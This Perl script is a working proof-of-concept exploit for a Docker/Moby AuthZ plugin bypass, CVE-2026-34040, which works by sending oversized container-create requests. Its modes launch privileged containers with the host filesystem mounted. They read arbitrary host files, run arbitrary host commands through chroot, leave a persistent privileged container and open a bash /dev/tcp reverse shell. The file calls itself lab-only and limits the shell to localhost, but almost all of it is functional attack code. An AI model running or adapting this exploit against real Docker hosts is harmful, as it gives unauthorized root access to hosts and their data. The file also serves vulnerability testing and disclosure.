#!/usr/bin/env perl
#
# CVE-2026-34040 Lab PoC - Docker/Moby AuthZ plugin bypass via oversized request body.
#
# Verified facts:
#   CVE        : CVE-2026-34040
#   CVSS 3.1   : 8.8  (CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H)
#   CWE        : CWE-288, CWE-863
#   Affected   : moby/moby < 29.3.1, moby/moby/v2 < 2.0.0-beta.8
#   Fixed in   : 29.3.1, 2.0.0-beta.8
#   Root cause : incomplete fix for CVE-2024-41110
#   Mechanism  : a request body > maxBodySize (1MB in vulnerable versions) makes the
#                daemon forward an EMPTY body to the AuthZ plugin while the daemon
#                itself processes the full original request -> AuthZ bypass.
#
# Modes:
#   check                Compare small request vs oversized request.
#   read-host-file       Read a host file through privileged container + host bind mount.
#   rce-proof            Write a marker file on the host using chroot.
#   host-command         Run a user-provided command on the host through chroot.
#   shell-container      Create and start a long-running privileged container for manual chroot.
#   reverse-shell-local  Local lab reverse shell using host network mode.
#
# Scope limitations:
#   - Local UNIX socket only (/var/run/docker.sock); matches the official AV:L (Local) vector.
#   - No remote TCP Docker API support
#   - No scanning
#   - Intended for authorized lab environments only
#
# This file is a faithful Perl port of the original poc.py: identical modes,
# flags, HTTP requests, console output and exit codes. Subroutine names follow
# the Python original 1:1 for easy side-by-side review. Only core Perl modules
# are used (Perl >= 5.14). The original poc.py is left untouched.

use strict;
use warnings;

use Encode            qw( decode );
use Errno             qw( EINTR EAGAIN EWOULDBLOCK EACCES EPERM );
use File::Basename    qw( basename );
use Getopt::Long      ();
use IO::Socket::UNIX;
use JSON::PP          ();
use Socket            qw( SOCK_STREAM SOL_SOCKET SO_RCVTIMEO SO_SNDTIMEO );
use Time::HiRes       qw( time sleep );

# ---------------------------------------------------------------------------
# Constants (module-level DEFAULT_* from the Python original)
# ---------------------------------------------------------------------------

use constant {
    DEFAULT_SOCKET      => '/var/run/docker.sock',
    DEFAULT_API_VERSION => 'v1.51',
    DEFAULT_IMAGE       => 'alpine',
    PADDING_SIZE        => 1024 * 1024 + 1,
};

my %LABEL_BASE = (
    'poc'      => 'cve-2026-34040-full-lab',
    'lab_only' => 'true',
);

my @MODES = qw(
    check
    read-host-file
    rce-proof
    host-command
    shell-container
    reverse-shell-local
);

# Compact JSON encoder equivalent to Python's
# json.dumps(payload, separators=(",", ":")). Keys are sorted (canonical) so the
# encoded body is deterministic; JSON object key order is semantically irrelevant
# to the Docker daemon and the encoded size is exactly the same as in Python.
my $JSON_CODER = JSON::PP->new->ascii->canonical->utf8;

# ---------------------------------------------------------------------------
# Lightweight exception objects mirroring Python's PermissionError and
# FileNotFoundError; caught by the entry block at the bottom of this file.
# ---------------------------------------------------------------------------

sub _permission_error {
    my ($message) = @_;
    return bless { message => $message }, 'PermissionError';
}

sub _file_not_found_error {
    my ($message) = @_;
    return bless { message => $message }, 'FileNotFoundError';
}

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

# Perl port of Python's shlex.quote() (POSIX shell single-quoting).
sub shquote {
    my ($s) = @_;
    return "''" unless defined $s && length $s;
    return $s if $s =~ m{\A[\w\@%+=:,./-]*\z}a;    # no unsafe characters
    (my $quoted = $s) =~ s/'/'"'"'/g;              # double up single quotes
    return "'$quoted'";
}

sub oversized_labels {
    my %labels = %LABEL_BASE;
    $labels{'padding'} = 'A' x PADDING_SIZE;
    return \%labels;
}

sub docker_request {
    my ($sock_path, $method, $path, $body, $timeout) = @_;
    $body    = '' unless defined $body;
    $timeout = 20 unless defined $timeout;

    if (!-e $sock_path) {
        die _file_not_found_error("Docker socket not found: $sock_path");
    }

    my $request = (
          "$method $path HTTP/1.1\r\n"
        . "Host: docker\r\n"
        . "User-Agent: cve-2026-34040-full-lab-poc\r\n"
        . "Content-Type: application/json\r\n"
        . "Content-Length: " . length($body) . "\r\n"
        . "Connection: close\r\n"
        . "\r\n"
    ) . $body;

    my $sock = IO::Socket::UNIX->new(
        Peer    => $sock_path,
        Type    => SOCK_STREAM,
        Timeout => $timeout,
    );
    if (!$sock) {
        if ($!{EACCES} || $!{EPERM}) {
            die _permission_error("connect($sock_path): $!");
        }
        die "docker_request: connect($sock_path): $!\n";
    }

    # IO::Socket's Timeout only covers connect(); apply the same timeout to
    # reads and writes like Python's socket.settimeout(). Failure to set these
    # is non-fatal: the daemon closes the connection (Connection: close) anyway.
    my $seconds = int($timeout);
    my $usecs   = int(($timeout - $seconds) * 1_000_000);
    my $timeval = pack('l!l!', $seconds, $usecs);
    $sock->setsockopt(SOL_SOCKET, SO_SNDTIMEO, $timeval);
    $sock->setsockopt(SOL_SOCKET, SO_RCVTIMEO, $timeval);

    # sendall()
    my $sent_total = 0;
    my $length     = length $request;
    while ($sent_total < $length) {
        my $written = syswrite($sock, $request, $length - $sent_total, $sent_total);
        if (!defined $written) {
            next if $! == EINTR;
            die "docker_request: sendall: $!\n";
        }
        $sent_total += $written;
    }

    # recv() loop: stop on EOF, on timeout (Python: socket.timeout) or on error.
    my $raw = '';
    while (1) {
        my $chunk = '';
        my $read  = sysread($sock, $chunk, 65536);
        if (!defined $read) {
            next if $! == EINTR;
            last if $! == EAGAIN || $! == EWOULDBLOCK;
            die "docker_request: recv: $!\n";
        }
        last if $read == 0;
        $raw .= $chunk;
    }
    close($sock);

    # Python: raw.partition(b"\r\n\r\n")
    my $header        = $raw;
    my $response_body = '';
    my $sep           = index($raw, "\r\n\r\n");
    if ($sep >= 0) {
        $header        = substr($raw, 0, $sep);
        $response_body = substr($raw, $sep + 4);
    }

    my $nl          = index($header, "\r\n");
    my $status_line = $nl >= 0 ? substr($header, 0, $nl) : $header;
    $status_line = decode('Latin-1', $status_line);

    my $status_code = 0;
    my @words       = split ' ', $status_line;
    if (@words >= 2 && $words[1] =~ /\A\d+\z/) {
        $status_code = int($words[1]);
    }

    return ($status_code, $status_line, $response_body);
}

sub json_body {
    my ($payload) = @_;
    return $JSON_CODER->encode($payload);
}

sub parse_json_response {
    my ($body) = @_;
    my $data = eval { $JSON_CODER->decode(defined $body ? $body : '') };
    return (ref $data eq 'HASH') ? $data : {};
}

sub extract_container_id {
    my ($body) = @_;
    my $data = parse_json_response($body);
    my $cid  = $data->{'Id'};
    return (defined $cid && !ref $cid && length $cid) ? $cid : undef;
}

sub print_response {
    my ($prefix, $status_line, $body, $max_body) = @_;
    $max_body = 400 unless defined $max_body;

    print "$prefix: $status_line\n";
    if (defined $body && length $body) {
        my $text = decode('UTF-8', substr($body, 0, $max_body));
        print "$prefix body: $text\n";
    }
}

sub create_container {
    my ($sock, $api, $name, $payload, $timeout) = @_;
    my $path = "/$api/containers/create?name=$name";
    my $body = json_body($payload);
    my ($status, $line, $resp) = docker_request($sock, 'POST', $path, $body, $timeout);
    my $cid = extract_container_id($resp);
    return ($status, $line, $resp, $cid);
}

sub start_container {
    my ($sock, $api, $cid, $timeout) = @_;
    return docker_request($sock, 'POST', "/$api/containers/$cid/start", '', $timeout);
}

sub logs_container {
    my ($sock, $api, $cid, $timeout) = @_;
    return docker_request(
        $sock, 'GET', "/$api/containers/$cid/logs?stdout=true&stderr=true", '', $timeout,
    );
}

sub remove_container {
    my ($sock, $api, $cid, $timeout) = @_;
    my ($status, $line, $body) = docker_request(
        $sock, 'DELETE', "/$api/containers/$cid?force=true", '', $timeout,
    );
    if ($status == 204 || $status == 404) {
        print '[cleanup] removed or already gone: ' . substr($cid, 0, 12) . "\n";
    }
    else {
        print_response('[cleanup warning]', $line, $body);
    }
}

sub wait_short {
    sleep(1.2);
}

sub require_explicit_host_execution {
    my ($args) = @_;
    if (!$args->{'i_understand_this_runs_on_host'}) {
        print STDERR
            "This mode can execute commands on the host in your lab.\n",
            "Re-run with --i-understand-this-runs-on-host if this is your authorized test VM.\n";
        exit 2;
    }
}

sub build_check_payload {
    my ($image, $oversized) = @_;
    my $labels = $oversized ? oversized_labels() : { %LABEL_BASE };
    return {
        'Image'      => $image,
        'Cmd'        => ['true'],
        'HostConfig' => { 'Privileged' => JSON::PP::true() },
        'Labels'     => $labels,
    };
}

# ---------------------------------------------------------------------------
# Modes
# ---------------------------------------------------------------------------

sub mode_check {
    my ($args) = @_;
    my $unique     = int(time());
    my $small_name = "cve-34040-small-$unique";
    my $big_name   = "cve-34040-big-$unique";

    print '=' x 72, "\n";
    print "CVE-2026-34040 AuthZ bypass check\n";
    print '=' x 72, "\n";

    my $small_payload = build_check_payload($args->{'image'}, 0);
    my $big_payload   = build_check_payload($args->{'image'}, 1);

    print "[1] Small request: AuthZ should block this\n";
    print '    payload size: ' . length(json_body($small_payload)) . " bytes\n";
    my ($s_status, $s_line, $s_body, $s_id) = create_container(
        $args->{'socket'}, $args->{'api_version'}, $small_name, $small_payload, $args->{'timeout'},
    );
    print_response('    response', $s_line, $s_body);
    if (defined $s_id && !$args->{'keep'}) {
        remove_container($args->{'socket'}, $args->{'api_version'}, $s_id, $args->{'timeout'});
    }

    print "\n";
    print "[2] Oversized request: vulnerable target may pass AuthZ\n";
    print '    payload size: ' . length(json_body($big_payload)) . " bytes\n";
    my ($b_status, $b_line, $b_body, $b_id) = create_container(
        $args->{'socket'}, $args->{'api_version'}, $big_name, $big_payload, $args->{'timeout'},
    );
    print_response('    response', $b_line, $b_body);
    if (defined $b_id && !$args->{'keep'}) {
        remove_container($args->{'socket'}, $args->{'api_version'}, $b_id, $args->{'timeout'});
    }

    print "\n";
    print '=' x 72, "\n";
    print "Interpretation\n";
    print '=' x 72, "\n";
    if ($s_status != 403) {
        print "[!] Baseline request was not blocked. AuthZ policy may not be enforcing privileged checks.\n";
    }
    elsif ($b_status == 403) {
        print "[-] Oversized request was blocked. Target appears patched/protected.\n";
    }
    elsif (grep { $b_status == $_ } 201, 404, 400, 409) {
        print "[+] Bypass behavior observed: small request was denied, oversized request reached Docker processing.\n";
        if ($b_status == 404) {
            print "    404 usually means the image is missing. Run: sudo docker pull alpine\n";
        }
    }
    else {
        print "[?] Inconclusive. Review response details manually.\n";
    }
    return 0;
}

sub mode_read_host_file {
    my ($args) = @_;
    my $unique = int(time());
    my $name   = "cve-34040-read-$unique";

    my $host_file = $args->{'host_file'};
    if (substr($host_file, 0, 1) ne '/') {
        print STDERR "--host-file must be an absolute path like /etc/hostname\n";
        return 2;
    }

    # Avoid shell interpolation: pass file path directly to cat.
    my $payload = {
        'Image'      => $args->{'image'},
        'Cmd'        => ['cat', "/host$host_file"],
        'HostConfig' => {
            'Privileged' => JSON::PP::true(),
            'Binds'      => ['/:/host:ro'],
        },
        'Labels'     => oversized_labels(),
    };

    print '=' x 72, "\n";
    print "CVE-2026-34040 impact demo: read host file\n";
    print '=' x 72, "\n";
    print "target host file: $host_file\n";
    my ($status, $line, $body, $cid) = create_container(
        $args->{'socket'}, $args->{'api_version'}, $name, $payload, $args->{'timeout'},
    );
    print_response('[create]', $line, $body);

    if (!defined $cid) {
        print "No container was created.\n";
        return 1;
    }

    print "[container] $cid\n";
    my ($start_status, $start_line, $start_body) = start_container(
        $args->{'socket'}, $args->{'api_version'}, $cid, $args->{'timeout'},
    );
    print_response('[start]', $start_line, $start_body);

    wait_short();
    my ($log_status, $log_line, $log_body) = logs_container(
        $args->{'socket'}, $args->{'api_version'}, $cid, $args->{'timeout'},
    );
    print_response('[logs]', $log_line, $log_body, 4000);

    if (!$args->{'keep'}) {
        remove_container($args->{'socket'}, $args->{'api_version'}, $cid, $args->{'timeout'});
    }
    else {
        print "[keep] container kept: $cid\n";
    }

    return 0;
}

sub mode_rce_proof {
    my ($args) = @_;
    require_explicit_host_execution($args);

    my $unique = int(time());
    my $name   = "cve-34040-rce-proof-$unique";
    my $marker = '/tmp/cve_2026_34040_rce_proof';

    my $host_cmd =
          'id > '       . shquote($marker) . '; '
        . 'hostname >> ' . shquote($marker) . '; '
        . 'whoami >> '   . shquote($marker) . '; '
        . 'date >> '     . shquote($marker);

    my $payload = {
        'Image'      => $args->{'image'},
        'Cmd'        => [
            '/bin/sh',
            '-c',
            'chroot /host /bin/bash -lc ' . shquote($host_cmd) . " && cat /host$marker",
        ],
        'HostConfig' => {
            'Privileged' => JSON::PP::true(),
            'Binds'      => ['/:/host'],
        },
        'Labels'     => oversized_labels(),
    };

    print '=' x 72, "\n";
    print "CVE-2026-34040 impact demo: host RCE proof\n";
    print '=' x 72, "\n";
    print "marker file on host: $marker\n";

    my ($status, $line, $body, $cid) = create_container(
        $args->{'socket'}, $args->{'api_version'}, $name, $payload, $args->{'timeout'},
    );
    print_response('[create]', $line, $body);

    if (!defined $cid) {
        print "No container was created.\n";
        return 1;
    }

    print "[container] $cid\n";
    my ($start_status, $start_line, $start_body) = start_container(
        $args->{'socket'}, $args->{'api_version'}, $cid, $args->{'timeout'},
    );
    print_response('[start]', $start_line, $start_body);

    wait_short();
    my ($log_status, $log_line, $log_body) = logs_container(
        $args->{'socket'}, $args->{'api_version'}, $cid, $args->{'timeout'},
    );
    print_response('[logs]', $log_line, $log_body, 4000);

    print "\n";
    print "Verify on host:\n";
    print "  cat $marker\n";
    print "Cleanup:\n";
    print "  sudo rm -f $marker\n";

    if (!$args->{'keep'}) {
        remove_container($args->{'socket'}, $args->{'api_version'}, $cid, $args->{'timeout'});
    }
    else {
        print "[keep] container kept: $cid\n";
    }

    return 0;
}

sub mode_host_command {
    my ($args) = @_;
    require_explicit_host_execution($args);

    if (!defined $args->{'cmd'} || !length $args->{'cmd'}) {
        print STDERR "--cmd is required for host-command mode\n";
        return 2;
    }

    my $unique = int(time());
    my $name   = "cve-34040-host-cmd-$unique";

    my $payload = {
        'Image'      => $args->{'image'},
        'Cmd'        => [
            '/bin/sh',
            '-c',
            'chroot /host /bin/bash -lc ' . shquote($args->{'cmd'}),
        ],
        'HostConfig' => {
            'Privileged' => JSON::PP::true(),
            'Binds'      => ['/:/host'],
        },
        'Labels'     => oversized_labels(),
    };

    print '=' x 72, "\n";
    print "CVE-2026-34040 impact demo: host command\n";
    print '=' x 72, "\n";
    print 'command: ' . $args->{'cmd'} . "\n";

    my ($status, $line, $body, $cid) = create_container(
        $args->{'socket'}, $args->{'api_version'}, $name, $payload, $args->{'timeout'},
    );
    print_response('[create]', $line, $body);

    if (!defined $cid) {
        print "No container was created.\n";
        return 1;
    }

    print "[container] $cid\n";
    my ($start_status, $start_line, $start_body) = start_container(
        $args->{'socket'}, $args->{'api_version'}, $cid, $args->{'timeout'},
    );
    print_response('[start]', $start_line, $start_body);

    wait_short();
    my ($log_status, $log_line, $log_body) = logs_container(
        $args->{'socket'}, $args->{'api_version'}, $cid, $args->{'timeout'},
    );
    print_response('[logs]', $log_line, $log_body, 4000);

    if (!$args->{'keep'}) {
        remove_container($args->{'socket'}, $args->{'api_version'}, $cid, $args->{'timeout'});
    }
    else {
        print "[keep] container kept: $cid\n";
    }

    return 0;
}

sub mode_shell_container {
    my ($args) = @_;
    my $unique = int(time());
    my $name   = "cve-34040-shell-$unique";

    my $payload = {
        'Image'      => $args->{'image'},
        'Cmd'        => ['sleep', 'infinity'],
        'HostConfig' => {
            'Privileged' => JSON::PP::true(),
            'Binds'      => ['/:/host'],
        },
        'Labels'     => oversized_labels(),
    };

    print '=' x 72, "\n";
    print "CVE-2026-34040 impact demo: long-running privileged container\n";
    print '=' x 72, "\n";

    my ($status, $line, $body, $cid) = create_container(
        $args->{'socket'}, $args->{'api_version'}, $name, $payload, $args->{'timeout'},
    );
    print_response('[create]', $line, $body);

    if (!defined $cid) {
        print "No container was created.\n";
        return 1;
    }

    my ($start_status, $start_line, $start_body) = start_container(
        $args->{'socket'}, $args->{'api_version'}, $cid, $args->{'timeout'},
    );
    print_response('[start]', $start_line, $start_body);

    print "\n";
    print "[container]\n";
    print "$cid\n";
    print "\n";
    print "Manual demo commands:\n";
    print "  sudo docker exec -it $cid /bin/sh\n";
    print "  chroot /host /bin/bash\n";
    print "  id\n";
    print "  hostname\n";
    print "  whoami\n";
    print "\n";
    print "Cleanup:\n";
    print "  sudo docker rm -f $cid\n";

    if (!$args->{'keep'}) {
        print "\n";
        print "[note] This mode is useful with --keep. Container is kept by default for this mode.\n";
        print "[keep] container kept: $cid\n";
    }

    return 0;
}

sub mode_reverse_shell_local {
    my ($args) = @_;
    require_explicit_host_execution($args);

    my $lhost = $args->{'lhost'};
    my $lport = $args->{'lport'};

    if ($lhost ne '127.0.0.1' && $lhost ne 'localhost') {
        print STDERR
            "reverse-shell-local only allows --lhost 127.0.0.1 or localhost.\n",
            "This is intentional so the packaged lab PoC stays local-only.\n";
        return 2;
    }

    if ($lport !~ /\A\d+\z/ || $lport < 1 || $lport > 65535) {
        print STDERR "--lport must be between 1 and 65535\n";
        return 2;
    }

    my $unique = int(time());
    my $name   = "cve-34040-revshell-local-$unique";

    my $rev_cmd = "bash -i >& /dev/tcp/$lhost/$lport 0>&1";

    my $payload = {
        'Image'      => $args->{'image'},
        'Cmd'        => [
            '/bin/sh',
            '-c',
            'chroot /host /bin/bash -lc ' . shquote($rev_cmd),
        ],
        'HostConfig' => {
            'Privileged'  => JSON::PP::true(),
            'Binds'       => ['/:/host'],
            'NetworkMode' => 'host',
        },
        'Labels'     => oversized_labels(),
    };

    print '=' x 72, "\n";
    print "CVE-2026-34040 impact demo: local reverse shell\n";
    print '=' x 72, "\n";
    print "Before running this mode, open another terminal on the same VM:\n";
    print "  nc -lvnp $lport\n";
    print "\n";
    print "reverse shell target: $lhost:$lport\n";

    my ($status, $line, $body, $cid) = create_container(
        $args->{'socket'}, $args->{'api_version'}, $name, $payload, $args->{'timeout'},
    );
    print_response('[create]', $line, $body);

    if (!defined $cid) {
        print "No container was created.\n";
        return 1;
    }

    print "[container] $cid\n";
    my ($start_status, $start_line, $start_body) = start_container(
        $args->{'socket'}, $args->{'api_version'}, $cid, $args->{'timeout'},
    );
    print_response('[start]', $start_line, $start_body);

    print "\n";
    print "If listener is open, the shell should connect there.\n";
    print "Cleanup after demo:\n";
    print "  sudo docker rm -f $cid\n";

    if ($args->{'keep'}) {
        print "[keep] container kept: $cid\n";
    }

    return 0;
}

# ---------------------------------------------------------------------------
# CLI (argparse equivalent)
# ---------------------------------------------------------------------------

sub usage {
    # Byte-for-byte equivalent of the original argparse --help output
    # (Python 3.12 formatting, 80-column wrapping).
    my $prog = basename($0);
    return <<"END";
usage: $prog [-h]
              [--mode {check,read-host-file,rce-proof,host-command,shell-container,reverse-shell-local}]
              [--socket SOCKET] [--api-version API_VERSION] [--image IMAGE]
              [--timeout TIMEOUT] [--keep] [--host-file HOST_FILE] [--cmd CMD]
              [--lhost LHOST] [--lport LPORT]
              [--i-understand-this-runs-on-host]

CVE-2026-34040 full lab PoC over local Docker UNIX socket

options:
  -h, --help            show this help message and exit
  --mode {check,read-host-file,rce-proof,host-command,shell-container,reverse-shell-local}
                        PoC mode
  --socket SOCKET       Docker UNIX socket path
  --api-version API_VERSION
                        Docker API version, e.g. v1.51
  --image IMAGE         Container image to use
  --timeout TIMEOUT     Socket timeout in seconds
  --keep                Keep created containers where applicable
  --host-file HOST_FILE
                        Host file path for read-host-file mode
  --cmd CMD             Host command for host-command mode
  --lhost LHOST         Local reverse shell host. Only 127.0.0.1/localhost
                        allowed
  --lport LPORT         Local reverse shell port
  --i-understand-this-runs-on-host
                        Required for modes that execute commands on the host
                        in the lab
END
}

sub build_parser {
    my ($argv) = @_;

    my %args = (
        mode                           => 'check',
        socket                         => DEFAULT_SOCKET,
        api_version                    => DEFAULT_API_VERSION,
        image                          => DEFAULT_IMAGE,
        timeout                        => 20,
        keep                           => 0,
        host_file                      => '/etc/hostname',
        cmd                            => undef,
        lhost                          => '127.0.0.1',
        lport                          => 4444,
        i_understand_this_runs_on_host => 0,
    );

    my $help   = 0;
    my $parser = Getopt::Long::Parser->new;
    $parser->configure('no_ignore_case');
    my $ok = $parser->getoptionsfromarray(
        $argv,
        'mode=s'                          => \$args{mode},
        'socket=s'                        => \$args{socket},
        'api-version=s'                   => \$args{api_version},
        'image=s'                         => \$args{image},
        'timeout=i'                       => \$args{timeout},
        'keep'                            => \$args{keep},
        'host-file=s'                     => \$args{host_file},
        'cmd=s'                           => \$args{cmd},
        'lhost=s'                         => \$args{lhost},
        'lport=i'                         => \$args{lport},
        'i-understand-this-runs-on-host'  => \$args{i_understand_this_runs_on_host},
        'help|h'                          => \$help,
    );

    if ($help) {
        print usage();
        exit 0;
    }
    if (!$ok) {
        print STDERR usage();
        exit 2;
    }

    my $prog = basename($0);
    if (@$argv) {
        print STDERR usage();
        printf STDERR "%s: error: unrecognized arguments: %s\n", $prog, join(' ', @$argv);
        exit 2;
    }
    if (!grep { $_ eq $args{mode} } @MODES) {
        print STDERR usage();
        printf STDERR "%s: error: argument --mode: invalid choice: '%s' (choose from %s)\n",
            $prog, $args{mode}, join(', ', @MODES);
        exit 2;
    }

    # Decode string options from raw bytes to characters (Python receives str).
    for my $key (qw( mode socket api_version image host_file cmd lhost )) {
        next unless defined $args{$key};
        $args{$key} = decode('UTF-8', $args{$key});
    }

    return \%args;
}

sub main {
    my $args = build_parser(\@ARGV);

    my %handlers = (
        'check'               => \&mode_check,
        'read-host-file'      => \&mode_read_host_file,
        'rce-proof'           => \&mode_rce_proof,
        'host-command'        => \&mode_host_command,
        'shell-container'     => \&mode_shell_container,
        'reverse-shell-local' => \&mode_reverse_shell_local,
    );

    my $handler = $handlers{ $args->{'mode'} };
    if (!$handler) {
        printf STDERR "Unknown mode: %s\n", $args->{'mode'};
        return 2;
    }

    return $handler->($args);
}

# ---------------------------------------------------------------------------
# Entry point (equivalent of Python's __main__ block)
# ---------------------------------------------------------------------------

MAIN: {
    binmode(STDOUT, ':encoding(UTF-8)');
    binmode(STDERR, ':encoding(UTF-8)');

    my $exit_code;
    my $completed = eval { $exit_code = main(); 1 };

    if (!$completed) {
        my $error = $@;
        if (ref($error) eq 'PermissionError') {
            print STDERR "Permission denied. Try sudo or an account that can access /var/run/docker.sock.\n";
            $exit_code = 1;
        }
        elsif (ref($error) eq 'FileNotFoundError') {
            print STDERR $error->{'message'}, "\n";
            $exit_code = 1;
        }
        else {
            # Unexpected error: Perl's counterpart of an uncaught Python traceback.
            print STDERR $error;
            $exit_code = 1;
        }
    }

    exit($exit_code);
}
